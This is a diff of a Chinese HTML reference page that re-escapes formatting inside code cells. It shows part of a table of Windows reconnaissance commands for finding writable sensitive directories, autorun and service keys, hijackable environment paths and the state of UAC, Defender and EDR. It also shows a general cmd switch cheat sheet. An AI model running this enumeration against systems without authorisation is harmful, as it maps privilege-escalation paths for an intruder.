-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">icacls C:\Windows\System32</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">icacls</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">[敏感目录]</font></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;icacls C:\Windows\System32&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;icacls&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">[敏感目录]</font></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">识别可写入的敏感目录或ACL权限配置错误。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">注册表项（读取）（Registry Keys (read)）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">reg query HKLM\SYSTEM\CurrentControlSet\Services</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;reg query HKLM\SYSTEM\CurrentControlSet\Services&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">导出服务键值、自动运行（AutoRun）条目等。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">进程与镜像路径（Processes &amp; Image Paths）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">tasklist /v</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">wmic process get name,executablepath</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;tasklist /v&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;wmic process get name,executablepath&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">识别特权进程及可执行文件路径。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">环境变量（Environment Variables）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">set</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;set&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">检查PATH、TEMP、PSModulePath等是否存在可劫持的条目。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">事件日志&#x2F;Sysmon（Event Logs &#x2F; Sysmon）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">wevtutil qe Security /q:* /f:text</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">（PowerShell）</font></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;wevtutil qe Security /q:* /f:text&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">（PowerShell）</font></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">收集进程创建、服务变更等日志；若存在Sysmon，则检查其事件。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">UAC&#x2F;防御软件&#x2F;EDR状态（UAC &#x2F; Defender &#x2F; EDR state）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">（检查UAC）；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">Get-MpComputerStatus</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">（PowerShell，检查Defender状态）</font></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">（检查UAC）；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;Get-MpComputerStatus&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">（PowerShell，检查Defender状态）</font></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">了解防御态势（如UAC是否启用、Defender&#x2F;EDR状态）及可用的缓解措施。</font></td>
 </tr>
 </tbody></table>
@@ -362,392 +364,388 @@
 </thead>
 <tbody><tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">文件管理</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">dir</font></code></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/s</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;dir&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/s&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">递归搜索子目录</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/b</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/b&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">简明格式(仅路径和文件名)</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/a:[d</td>
+<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;a:[d</td>
 <td>h</td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/p</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/p&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">分页显示</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/w</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/w&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">宽列表格式</font></td>
 </tr>
 <tr>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">copy</font></code></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/y</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;copy&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/y&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">覆盖时不提示</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/v</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/v&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">验证文件写入正确性</font></td>
 </tr>
 <tr>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">xcopy</font></code></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/e</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;xcopy&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/e&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">复制目录和子目录(含空目录)</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/h</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/h&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">复制隐藏和系统文件</font></td>
 </tr>
 <tr>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">robocopy</font></code></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/mir</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;robocopy&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/mir&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">镜像目录树(同步删除)</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/mt:n</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/mt:n&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">多线程复制(n&#x3D;线程数)</font></td>
 </tr>
 <tr>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">del</font></code></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/f</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;del&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/f&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">强制删除只读文件</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/s</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/s&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">从所有子目录删除指定文件</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">进程管理</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">tasklist</font></code></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/v</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;tasklist&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/v&lt;/font&gt;</code></td>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">详细模式</font></strong><font style="color:rgba(0, 0, 0, 0.88);">(显示更多信息)</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/svc</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/svc&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">显示进程包含的服务</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/m [module]</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/m [module]&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">显示加载的DLL模块</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/fi &quot;filter&quot;</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/fi &quot;filter&quot;&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">过滤器条件</font></td>
 </tr>
 <tr>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">taskkill</font></code></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/im name</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;taskkill&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/im name&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">按映像名称结束进程</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/pid id</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/pid id&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">按进程ID结束进程</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/f</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/f&lt;/font&gt;</code></td>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">强制终止</font></strong><font style="color:rgba(0, 0, 0, 0.88);">进程</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">/t</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/t&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">终止子进程</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">网络诊断</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">ping</font></code></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-t</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;ping&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-t&lt;/font&gt;</code></td>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">持续ping</font></strong><font style="color:rgba(0, 0, 0, 0.88);">直到手动停止</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-n count</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-n count&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">指定发送请求次数</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-l size</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">size<code></font></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-l size&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">size&#96;</font></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">发送缓冲区大小</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-w timeout</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-w timeout&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">超时时间(毫秒)</font></td>
 </tr>
 <tr>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">ipconfig</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;all</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;ipconfig&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/all&lt;/font&gt;</code></td>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">显示完整配置信息</font></strong></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;release</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/release&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">释放IP地址租约</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;renew</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/renew&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">续订IP地址租约</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;flushdns</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/flushdns&lt;/font&gt;</code></td>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">清除DNS解析缓存</font></strong></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;displaydns</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/displaydns&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">显示DNS解析缓存内容</font></td>
 </tr>
 <tr>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">netstat</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-a</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;netstat&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-a&lt;/font&gt;</code></td>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">显示所有连接和监听端口</font></strong></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-n</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-n&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">以数字形式显示地址和端口号</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-b</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-b&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">显示创建连接的应用程序</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-o</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-o&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">显示拥有的进程ID</font></td>
 </tr>
 <tr>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">tracert</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-d</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;tracert&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-d&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">不将地址解析成主机名</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-h max_hops</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-h max_hops&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">搜索目标的最大跃点数</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">磁盘管理</font></strong></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">chkdsk</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;f</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;chkdsk&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/f&lt;/font&gt;</code></td>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">修复磁盘上的错误</font></strong></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;r</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/r&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">定位坏扇区并恢复可读信息</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;x</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/x&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">必要时强制卸载卷</font></td>
 </tr>
 <tr>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">format</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;fs:type</font><code></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">指定文件系统(FAT32/NTFS)</font></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;format&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/fs:type&lt;/font&gt;</code></td>
+<td><font style="color:rgba(0, 0, 0, 0.88);">指定文件系统(FAT32&#x2F;NTFS)</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;q</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/q&lt;/font&gt;</code></td>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">快速格式化</font></strong></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;a:size</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/a:size&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">分配单元大小</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">系统服务</font></strong></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">sc</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">query</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;sc&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;query&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">查询服务状态</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">start</font><code></td>
